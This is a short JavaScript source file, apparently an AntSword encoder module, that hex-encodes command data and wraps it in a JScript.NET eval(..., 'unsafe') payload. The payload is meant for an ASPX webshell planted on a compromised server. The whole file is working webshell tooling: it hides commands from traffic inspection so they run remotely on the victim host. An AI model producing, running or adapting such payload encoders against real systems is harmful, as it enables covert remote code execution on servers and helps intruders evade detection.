//
// aspx::hex 编码模块
//
// 把除了密码的其他参数都 hex 编码一次
//

'use strict';

module.exports = (pwd, data, ext = null) => {
    let randomID;
    if (ext.opts.otherConf['use-random-variable'] === 1) {
        randomID = antSword.utils.RandomChoice(antSword['RANDOMWORDS']);
    } else {
        randomID = `${antSword['utils'].RandomLowercase()}${Math.random().toString(16).substr(2)}`;
    }
    let hexencoder = "function HexAsciiConvert(hex:String) {var sb:System.Text.StringBuilder = new Sys" +
        "tem.Text.StringBuilder();var i;for(i=0; i< hex.Length; i+=2){sb.Append(System.Co" +
        "nvert.ToString(System.Convert.ToChar(Int32.Parse(hex.Substring(i,2), System.Glob" +
        "alization.NumberStyles.HexNumber))));}return sb.ToString();};";
    data[randomID] = Buffer
        .from(data['_'])
        .toString('hex');
    data[pwd] = `${hexencoder};eval(HexAsciiConvert(Request.Item["${randomID}"]),"unsafe");`;
    delete data['_'];
    return data;
}